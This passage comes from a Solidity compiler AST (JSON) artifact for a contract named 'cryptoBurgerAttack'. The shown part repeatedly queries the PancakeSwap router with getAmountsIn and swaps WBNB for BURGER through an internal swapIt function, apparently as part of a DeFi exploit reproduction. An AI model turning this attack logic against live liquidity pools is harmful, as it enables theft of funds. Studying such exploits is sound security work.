                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7972:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 763,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "7931:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 777,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7931:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 778,
                  "nodeType": "ExpressionStatement",
                  "src": "7931:64:0"
                },
                {
                  "expression": {
                    "id": 787,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 779,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "8005:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 784,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "8084:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 785,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "8113:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 781,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "8037:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 780,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "8020:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 782,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8020:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 783,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "8020:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 786,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8020:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "8005:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 788,
                  "nodeType": "ExpressionStatement",
                  "src": "8005:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 790,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "8144:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 791,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "8150:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 792,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "8158:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 794,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 793,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8171:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "8158:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 795,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "8175:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 800,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "8194:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 799,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "8186:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 798,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "8186:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 801,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "8186:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 797,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "8178:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 796,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "8178:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 802,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "8178:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 789,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "8137:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 803,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8137:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 804,
                  "nodeType": "ExpressionStatement",
                  "src": "8137:64:0"
                },
                {
                  "expression": {
                    "id": 813,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 805,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "8212:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 810,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "8291:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 811,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "8320:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 807,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "8244:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 806,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "8227:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 808,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8227:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 809,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "8227:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 812,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8227:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "8212:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 814,
                  "nodeType": "ExpressionStatement",
                  "src": "8212:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 816,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "8351:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 817,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "8357:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 818,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "8365:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 820,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 819,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8378:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "8365:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 821,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "8382:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 826,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "8401:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 825,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "8393:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 824,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "8393:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 827,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "8393:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 823,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "8385:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 822,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "8385:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 828,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "8385:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 815,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "8344:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 829,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8344:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 830,
                  "nodeType": "ExpressionStatement",
                  "src": "8344:64:0"
                },
                {
                  "expression": {
                    "id": 839,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 831,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "8418:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 836,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "8497:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 837,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "8526:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 833,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "8450:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 832,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "8433:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 834,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "8433:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 835,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "8433:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 838,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "8433:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "8418:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 840,
                  "nodeType": "ExpressionStatement",
                  "src": "8418:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 842,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "8557:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 843,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "8563:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 844,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "8571:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 846,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 845,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "8584:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "8571:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 847,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "8588:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 852,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "8607:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 851,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "8599:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 850,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "8599:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 853,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "8599:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 849,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "8591:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 848,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "8591:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 854,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "8591:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 841,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "8550:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 855,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "8550:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 856,
                  "nodeType": "ExpressionStatement",
                  "src": "8550:64:0"
                },
                {
                  "expression": {
                    "id": 865,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 857,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "8624:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
